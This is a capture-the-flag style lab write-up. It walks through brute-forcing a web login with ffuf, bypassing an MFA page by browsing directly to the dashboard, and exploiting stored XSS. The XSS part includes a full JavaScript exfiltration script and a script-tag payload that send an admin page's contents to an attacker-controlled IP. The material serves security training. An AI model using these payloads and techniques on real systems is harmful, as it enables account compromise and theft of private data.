# URL
https://www.hacksmarter.org/courses/4ad11d75-aefa-4b81-8f4e-8aba6bdc53b7/
# Concept
* webpage login form brute-forcing
* MFA bypass
  * navigate away from the MFA page
* data exfiltration via XSS vulnerability
# Method of solve
## Beginning Scans
* we are given two files with usernames and passwords
* there are only ports `22` and `80` open on the box
* there is a login page at `/login.html`
## Low-Priv User
* we capture a failed attempt at logging in at the `/login.html` page in the Burp Suite browser
* we save that login request to a file, and set fuzzing points in the resulting file
* we can use that with `FFuF` to brute-force the login and get credentials
```
ffuf -request request.txt -w ./usernames.txt:USER -w ./passwords.txt:PASS -request-proto http -mc all -fs 77
```
* now that we have a valid credential set, we can login to the app
* the problem is that we are faced with a MFA verification page
* when we arrive at the MFA page, we already logged in
  * we just need to manually navigate to the `dashboard.html` page to bypass it
## Privilege Escalation
* on the dashboard there is a form to submit questions
* this form is vulnerable to XSS (cross-site scripting)
* we attempt to steal cookies with the stored XSS vulnerability
  * there are no cookies to steal
* another attack we can use with XSS is using it to exfiltrate the contents of webpages that are not authorized by our current user
* we use this blog article and Github repo for reference:
```
https://trustedsec.com/blog/simple-data-exfiltration-through-xss
https://github.com/hoodoer/XSS-Data-Exfil
```
* in our case, our exfiltration JS page looks like this:
```JS
// TrustedSec Proof-of-Concept to steal 
// sensitive data through XSS payload


function read_body(xhr) 
{ 
        var data;

        if (!xhr.responseType || xhr.responseType === "text") 
        {
                data = xhr.responseText;
        } 
        else if (xhr.responseType === "document") 
        {
                data = xhr.responseXML;
        } 
        else if (xhr.responseType === "json") 
        {
                data = xhr.responseJSON;
        } 
        else 
        {
                data = xhr.response;
        }
        return data; 
}




function stealData()
{
        var uri = "/admin.html";

        xhr = new XMLHttpRequest();
        xhr.open("GET", uri, true);
        xhr.send(null);

        xhr.onreadystatechange = function()
        {
                if (xhr.readyState == XMLHttpRequest.DONE)
                {
                        // We have the response back with the data
                        var dataResponse = read_body(xhr);


                        // Time to exfiltrate the HTML response with the data
                        var exfilChunkSize = 2000;
                        var exfilData      = btoa(dataResponse);
                        var numFullChunks  = ((exfilData.length / exfilChunkSize) | 0);
                        var remainderBits  = exfilData.length % exfilChunkSize;

                        // Exfil the yummies
                        for (i = 0; i < numFullChunks; i++)
                        {
                                console.log("Loop is: " + i);

                                var exfilChunk = exfilData.slice(exfilChunkSize *i, exfilChunkSize * (i+1));

                                // Let's use an external image load to get our data out
                                // The file name we request will be the data we're exfiltrating
                                var downloadImage = new Image();
                                downloadImage.onload = function()
                                {
                                        image.src = this.src;
                                };

                                // Try to async load the image, whose name is the string of data
                                downloadImage.src = "http://10.200.76.17/exfil/" + i + "/" + exfilChunk + ".jpg";
                        }

                        // Now grab that last bit
                        var exfilChunk = exfilData.slice(exfilChunkSize * numFullChunks, (exfilChunkSize * numFullChunks) + remainderBits);
                        var downloadImage = new Image();
                        downloadImage.onload = function()
                        {
                        image.src = this.src;   
                        };

                        downloadImage.src = "http://10.200.76.17/exfil/" + "LAST" + "/" + exfilChunk + ".jpg";
                        console.log("Done exfiling chunks..");
                }
        }
}



stealData();
```
* we need to stand up a web server to conduct the attack, which we can do with Python
```
python -m http.server 80
```
* this is the payload we use to have the app access and execute the exfiltration script:
```
<script src=http://10.200.76.17/exfilPayload.js></script>
```
* after we send the payload, we get a lot of requests with base64-encoded strings, which are the contents of the `admin.html` page
* copy all the webserver traffic and put in a file, `raw.txt`
* then run the following two commands to get the original content of `admin.html`
```
grep '/exfil/' raw.txt | awk -F'/exfil/' '{print $2}' | awk -F'/' '{print $1 " " $2}' | awk -F'.jpg' '{print $1}' | while read i; do echo $i ; done > cleaned.txt
cat cleaned.txt | awk -F ' ' '{print $2}' | tr -d "\n" | base64 -d
```
